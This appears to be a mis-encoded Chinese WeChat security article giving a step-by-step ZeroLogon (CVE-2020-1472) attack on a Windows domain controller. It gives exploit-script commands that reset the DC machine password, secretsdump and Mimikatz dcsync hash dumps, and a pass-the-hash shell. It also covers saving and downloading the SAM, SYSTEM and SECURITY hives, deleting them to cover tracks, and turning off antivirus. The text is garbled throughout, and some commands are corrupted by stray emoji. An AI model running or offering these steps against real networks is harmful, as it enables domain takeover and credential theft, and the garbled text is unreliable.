> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3aJp9TTIomLLjMjR4mkzow)

å…¬ä¼—å·

**æ¼æ´ä»‹ç»**

åœ¨å»å¹´ 9 æœˆä»½ï¼Œå›½å¤–æŠ«éœ²äº† CVE-2020-1472(åˆè¢«å«åš ZeroLogon) çš„æ¼æ´è¯¦æƒ…ï¼Œç½‘ä¸Šä¹Ÿéšå³å…¬å¼€äº† Expã€‚

æ˜¯è¿‘å‡ å¹´ windows ä¸Šæ¯”è¾ƒé‡é‡çº§åˆ«çš„ä¸€ä¸ªæ¼æ´ã€‚é€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…åªéœ€èƒ½å¤Ÿè®¿é—®åŸŸæ§çš„ 445 ç«¯å£ï¼Œåœ¨æ— éœ€ä»»ä½•å‡­æ®çš„æƒ…å†µä¸‹èƒ½æ‹¿åˆ°åŸŸç®¡çš„æƒé™ã€‚

è¯¥æ¼æ´çš„äº§ç”Ÿæ¥æºäº Netlogon åè®®è®¤è¯çš„åŠ å¯†æ¨¡å—å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨æ²¡æœ‰å‡­è¯çš„æƒ…å†µæƒ…å†µä¸‹é€šè¿‡è®¤è¯ã€‚è¯¥æ¼æ´çš„æœ€ç¨³å®šåˆ©ç”¨æ˜¯è°ƒç”¨ netlogon ä¸­ RPC å‡½æ•° NetrServerPasswordSet2 æ¥é‡ç½®åŸŸæ§çš„å¯†ç ï¼Œä»è€Œä»¥åŸŸæ§çš„èº«ä»½è¿›è¡Œ Dcsync è·å–åŸŸç®¡æƒé™ã€‚CVE-2020-1472 æ¥é‡ç½®åŸŸæ§å¯†ç ã€‚

æ³¨æ„ï¼Œè¿™é‡Œæ˜¯åŸŸæ§å¯†ç ï¼Œä¸æ˜¯åŸŸç®¡çš„å¯†ç ã€‚æ˜¯åŸŸæ§è¿™ä¸ªæœºå™¨ç”¨æˆ·çš„å¯†ç ã€‚å¯èƒ½å¯¹åŸŸä¸æ˜¯å¾ˆç†Ÿæ‚‰çš„äººå¯¹è¿™ç‚¹ä¸æ˜¯å¾ˆäº†è§£ã€‚åœ¨åŸŸå†…ï¼Œæœºå™¨ç”¨æˆ·è·ŸåŸŸç”¨æˆ·ä¸€æ ·ï¼Œæ˜¯åŸŸå†…çš„æˆå‘˜ï¼Œä»–åœ¨åŸŸå†…çš„ç”¨æˆ·åæ˜¯æœºå™¨ç”¨æˆ· +$(å¦‚ DC2016\$)ï¼Œåœ¨æœ¬åœ°çš„ç”¨æˆ·åæ˜¯ SYSTEMã€‚

åœ¨æ‹¥æœ‰åŸŸæ§çš„æœºå™¨ç”¨æˆ·å¯†ç çš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨è¯¥å¯†ç ç™»å½•åŸŸæ§ï¼Œå› ä¸ºæœºå™¨ç”¨æˆ·æ˜¯ä¸å¯ä»¥ç™»å½•çš„ï¼Œä½†æ˜¯å› ä¸ºåŸŸæ§çš„æœºå™¨ç”¨æˆ·å…·å¤‡ Dcsync ç‰¹æƒï¼Œæˆ‘ä»¬å°±å¯ä»¥æ»¥ç”¨è¯¥ç‰¹æƒæ¥è¿›è¡Œ Dcsyncã€‚

**ç¯å¢ƒ**

æ”»å‡»æœº windows 10  

åŸŸæ§æœåŠ¡å™¨ windows server 2012 192.168.139.147

python 3.8

**å‡†å¤‡å·¥å…·**

*   https://github.com/VoidSec/CVE-2020-1472  
    
*   https://github.com/maaaaz/impacket-examples-windowsÂ ã€è¿™æ˜¯ä¸‹é¢åŒ…ä¸­è„šæœ¬è½¬æˆçš„ exeã€‘
    
*   https://github.com/SecureAuthCorp/impacket
    

impacket éœ€è¦ä½¿ç”¨æœ€æ–°çš„è¦ç”¨ Impacket v0.9.22.dev1+20200915.160006.1397e2b5ï¼Œå¹¶ä¸æ˜¯ release ä¸­ï¼Œæˆ–è€… pip ä¸­ç›´æ¥æŒ‡å®šçš„

å»ºè®®: git cloneÂ 

https://github.com/SecureAuthCorp/impacket.git

**å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ï¼š**

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLc8n8hQA9AfDYvXY3KauibMcYIO5UXzHGkBsrbciazOD9Dy10QoJTlz9g/640?wx_fmt=png)

å…¶æ¬¡å¦‚æœä½¿ç”¨çš„ linuxï¼Œæ‰§è¡Œè„šæœ¬åœ¨å‡ºç° $ ä¹‹ç±»çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦ \ è½¬ä¹‰ï¼Œæˆ‘åœ¨ window ä¸‹æ‰§è¡Œï¼Œæ²¡é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼ŒåŸŸå’Œè®¡ç®—æœºåææ··æ·†ï¼Œå¯¼è‡´å‚æ•°å¡«å†™é”™è¯¯ï¼Œå“ªä¸ªæ˜¯åŸŸï¼Œå“ªä¸ªæ˜¯è®¡ç®—æœºåï¼Œçœ‹ä¸‹å›¾ï¼š

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLRgKQudo477KFiaseVnN2Qpoey1eDfAUJicHkaAcsXGkZBZ9Mpq3vkBnw/640?wx_fmt=png)

**å…³äºå‘ç‚¹**

åœ¨ windows ä¸­æœ‰ python å¯åŠ¨å™¨ï¼Œpy -3 æŒ‡å®šä½¿ç”¨ python3ï¼Œé˜²æ­¢é€‰é”™ python ç‰ˆæœ¬ã€‚  

å®‰è£… impacket è¿™æ­¥ï¼Œæ‰‹åŠ¨å®‰è£…ï¼Œå¹¶ä¸”æŠŠ requirements.txt ä¸­çš„ impacket==0.9.21 è¿™è¡Œå»æ‰ï¼Œä¸ç„¶æ‰§è¡Œ py -3 pip install -r requirements.txt å®‰è£…å…¶ä»–åº“æ—¶ï¼Œimpacket åˆè£…ä¸€éï¼Œä¼šè¦†ç›–æ‰æœ€æ–°ç‰ˆã€‚

**å®‰è£…è¿‡ç¨‹**

å…ˆå¸è½½æ—§ç‰ˆæœ¬

```
py -3 -m pip uninstall impacket
```

å®‰è£…æ–°ç‰ˆæœ¬

```
git clone 
https://github.com/SecureAuthCorp/impacket
cd impacket
py -3 setup.py install
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLt2wvT0nCSUFibATIjI2K62dBsm0vhOxXyLFrFqkzia0ibibTG6tFDTAncg/640?wx_fmt=png)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLoeJECHsFqibiaVTviabxosNJsAHgVE4WhxN8HTGuWKibDAPmB09wNlX5Mg/640?wx_fmt=png)

**æŠ¥é”™è¯´æ˜**

AttributeError:  

```
module'impacket.dcerpc.v5.nrpc' has no attribute 'NetrServerPasswordSet2'ï¼Œå±äºå‘ç‚¹1ï¼Œæ‰‹åŠ¨å®‰è£…impacketè§£å†³ã€‚
```

secretsdump.py æ‰§è¡Œåæ— æ³•è·å– NTDS.DIT ä¿¡æ¯ï¼Œå¤šåŠæ˜¯åŸŸå’Œè®¡ç®—æœºåæ··æ·†æˆ–è€…å‡ºç° $ æœªè½¬ä¹‰ï¼Œå¯¹ç…§å‘ç‚¹è®¡ç®—æœºåç¡®è®¤ã€‚  

```
[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

å¤šåŠæ˜¯åŸŸå’Œè®¡ç®—æœºåæ··æ·†æˆ–è€…å‡ºç° $ æœªè½¬ä¹‰, å¯¹ç…§å‘ç‚¹ 3 çš„å›¾ç‰‡ï¼Œç¡®è®¤ä¸‹, è‡ªå·±ç¯å¢ƒä¸­å¯¹åº”çš„å‚æ•°å¡«å†™æ­£ç¡®æ²¡ã€‚  

**åˆ©ç”¨**

ç¯å¢ƒå‡†å¤‡å°±ç»ªä»¥åï¼Œè¿è¡Œ expï¼Œè®°å¾—å…³æ€è½¯  

```
py -3 cve-2020-1472-exploit.py -n DC -t 192.168.1.150
-n è®¡ç®—æœºå
-t åŸŸæ§ip
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDL45re3gvw1ARpeJ0qyicppJoyrWZs2odCESUhcaQHw14h5RZRkib9sCGA/640?wx_fmt=png)

æ£€æµ‹åˆ°å­˜åœ¨æ¼æ´, Y ç»§ç»­æ¸…ç©ºåŸŸæ§å¯†ç 

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLBIHXpjOQQzNNW1cWg6jwSXuv0tXO5dzicWXZYicE68tKaNn4UGR5ofiaA/640?wx_fmt=png)

æˆåŠŸä¹‹åç”¨åˆšåˆšä¸‹è½½çš„

impacket-examples-windows

é€šè¿‡ secretsdump.exe dump åŸŸç®¡ hash

```
.\secretsdump.exe -no-pass -just-dc DC$@192.168.1.150
-no-pass æ— å¯†ç ç™»å½•
-just-dc ä»…æå–NTDS.DITæ•°æ®ï¼ˆNTLMå“ˆå¸Œå’ŒKerberosé”®ï¼‰
DC$@192.168.1.150 è®¡ç®—æœºå$@åŸŸæ§ip
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLk3c1A8SN7wAnYRVWRQ9mjMlv48Q02jM4F1TztdpTxFicIGcm5ibnDRDQ/640?wx_fmt=png)

è·å–åŸŸæ§æœºå™¨ shell å’Œ å¯¼å‡ºåŸŸæ§è®¡ç®—æœºå¸æˆ·çš„åŸå§‹ NT å“ˆå¸Œ

```
hashes åŸŸç®¡ç†å‘˜çš„nthash:lmhash
.\wmiexec.exeâ€“hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab
test.com/administrator@192.168.1.150
```

æ­¤æ—¶ä¼šè¿”å›ä¸€ä¸ªäº¤äº’å¼åŸŸæ§ shell  

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLVg2Iq6ibSCGQnoicqU6IgkN2LrOyNgzX9DP5sJPqVoxqIic0mHCB5TszA/640?wx_fmt=png)

**æœ¬åœ°ä¿å­˜æ–‡ä»¶**

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
```

**ä¸‹è½½æ–‡ä»¶**  

```
get system.save
get sam.save
get security.save
```

**æ“¦å±è‚¡**  

```
del /f system.save
del /f sam.save
del /f security.save
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLZao2n3baUYOZKyF2yPmRDo8urQ1hciciaDWJllm7QicJlGriaeXE16PaiaQ/640?wx_fmt=png)

è¯»å–ä¸‹è½½çš„æ–‡ä»¶è®¡ç®—åŸæœ¬çš„æœºå™¨ç”¨æˆ·å¯†ç 

```
.\ secretsdump.exe -sam sam.save -system system.save -security security.save LOCAL
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLxZVjUcf2WJC4VhNcFEYdGdfbcwpkEIsfzbmWUOU6icdsdcnMgEyQGEA/640?wx_fmt=png)

éšåæŠŠå¯†ç é”¤å›å»ï¼Œè¿™é‡Œä½¿ç”¨çš„å€¼æ˜¯ $MACHINE.ACC: åçš„ hash

```
.\secretsdump.exe -no-pass -just-dc DC$@192.168.1.150
-no-pass æ— å¯†ç ç™»å½•
-just-dc ä»…æå–NTDS.DITæ•°æ®ï¼ˆNTLMå“ˆå¸Œå’ŒKerberosé”®ï¼‰
DC$@192.168.1.150 è®¡ç®—æœºå$@åŸŸæ§ip
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLwUbetjTlZdLr84ibFY2Lvo7DJSPGdpyialiaLHIiboZBkredyQBBmeoELg/640?wx_fmt=png)

**Mimikatz åˆ©ç”¨æ–¹å¼**

**æ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´**  

```
lsadump::zerologon/target:192.168.1.150 /accountğŸ˜ƒC$
lsadump::zerologon/target:192.168.1.150 /accountğŸ˜ƒC$ /exploit æ”»å‡»
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLYWjK7HmeO68sU3Isf1ErBw7BxPyFUcibLMJqt8ibfGc1w57h3selRKZg/640?wx_fmt=png)

```
lsadump::dcsync /domain:test.com /dcğŸ˜ƒC /user:Administrator/authuserğŸ˜ƒC$/authdomain:test/authpassword:""/authntlm
```

---- é€šè¿‡ dcsync dump åŸŸç®¡ hash

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLQsXsN0uUz4ziaAOAFQ5KFiccG6QN57oMfkW2TjJQyXxGxGjKbP6F952g/640?wx_fmt=png)

**æå‡æƒé™æ³¨å…¥ä¼šè¯**

```
privilege::debug
sekurlsa::pth/user:Administrator/doamin:. /rc4:570a9a65db8fba761c1008a51d4c95ab
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLbcIeKgdfTGw1IgSPvugJTeyurJlIU2ATzsw7PnG1XrcNxjHWDuJtsg/640?wx_fmt=png)

åœ¨æ³¨å…¥ä¼šè¯çš„çª—å£æ‰“å¼€ mimikatz æ¢å¤æœºå™¨ç”¨æˆ·å¯†ç  éšåå¯ä»¥å¼€å§‹ä¸‹ä¸€æ­¥æ“ä½œ

```
lsadump::postzerologon /target:192.168.1.150 /accountğŸ˜ƒC$
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLbMKGkLzBIGmpMGzaItGmMTiaPngkN3VgGAISh5qevPUdovibbQJhFthg/640?wx_fmt=png)

**å‚è€ƒï¼š**

1.https://www.t00ls.net/viewthread.php?tid=57866&extra=&highlight=cve-2020-1472&page=1

2.https://mp.weixin.qq.com/s/S9Hwb1-lLhh4QfI4b551SQ

**ã€ç«çº¿ zone ç¤¾åŒºå‘¨æ¿€åŠ±ã€‘**

2021.12.6Â ï½ 2021.12.12 å…¬å‘Š

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSbtOdh5nXHf5SvicnmEmOyeaOCWXTDCicads0MpeNakyZIRvkruNAKMChCuuY5hMXQg6HAia9AbJB7g/640?wx_fmt=png)

**ã€ç›¸å…³ç²¾é€‰æ–‡ç« ã€‘**

[![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLtKereRSEX6oOibBalCSKCfW8v1rVcJyhhicpicYjmb1sIEjuxvuBibW8hQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490494&idx=1&sn=09401d751eea65246d8b2bc821297417&chksm=eaaa939edddd1a88a8a8a1a77df9f793565a4435ebc7162cc6d86a26d0b08d8356517d2b2c15&scene=21#wechat_redirect)

  

[![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSbtOdh5nXHf5SvicnmEmOyef8AJTFtibI8Kbnqiaia9qIfxiafuDbiaArBHsiaao9iaQNfOyibryVygpOfVGA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490431&idx=1&sn=89bcc0f5806742c5b178e8714ed810a7&chksm=eaaa935fdddd1a49d1fc5a50b376a6b5fe5cc2642cd4f328c0573138c16fe30cd506d2daf750&scene=21#wechat_redirect)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSIRfXwN7wia1oIahwLqmXPfRtichicicJVra12DfCPDL7zlPUDu7MQYN3777icH4qp4AVkJpJ671ib2v3w/640?wx_fmt=png)

ç«çº¿ Zone æ˜¯ [ç«çº¿å®‰å…¨å¹³å°] è¿è¥çš„å°é—­å¼å®æˆ˜å®‰å…¨æ”»é˜²ç¤¾åŒºï¼Œç ”ç©¶è®¨è®ºå®æˆ˜æ”»é˜²æŠ€æœ¯ï¼Œå¹³å°å‘é¡¶å°–çš„ç™½å¸½å­æä¾›å®‰å…¨æµ‹è¯•çš„äº‘ç«¯åŸºç¡€è®¾æ–½ï¼Œç›®å‰ç«çº¿çš„é«˜çº§ç™½å¸½å­æ•°é‡å·²ç»è¿‘ä¸‡äººï¼Œæ¬¢è¿å…·å¤‡åˆ†äº«å’Œæ¢ç´¢ç²¾ç¥çš„ç™½å¸½å­åŠ å…¥ç«çº¿ Zone ç¤¾åŒºï¼Œå…±å»ºä¸€ä¸ªæœ‰æŠ€æœ¯æ°›å›´çš„ä¼˜è´¨ç¤¾åŒºï¼

å¦‚éœ€è½¬è½½ç«çº¿ Zone å…¬ä¼—å·å†…çš„æ–‡ç« è¯·è”ç³»ç«çº¿å°åŠ©æ‰‹ï¼šhxanquanï¼ˆå¾®ä¿¡ï¼‰

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSIRfXwN7wia1oIahwLqmXPfk0BkkSxLM7fHmYJ9NVhfjTV0T3uDmribomicSNL3lN2LlOIGKoGAB9fA/640?wx_fmt=jpeg)

 **å¾®ä¿¡å·** 

huoxian_zone

![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_gif/YxSSnpu6MW0CIoKC0f9U1ALN0bHmzzVfdqHmAlujAniaYos5t6H3zUomx1QoILFNCMdeV5eknVH2AfsYvjfV6iag/640?wx_fmt=gif)

ç‚¹å‡»é˜…è¯»åŸæ–‡ï¼ŒåŠ å…¥ç¤¾åŒºï¼Œå…±å»ºä¸€ä¸ªæœ‰æŠ€æœ¯æ°›å›´çš„ä¼˜è´¨ç¤¾åŒºï¼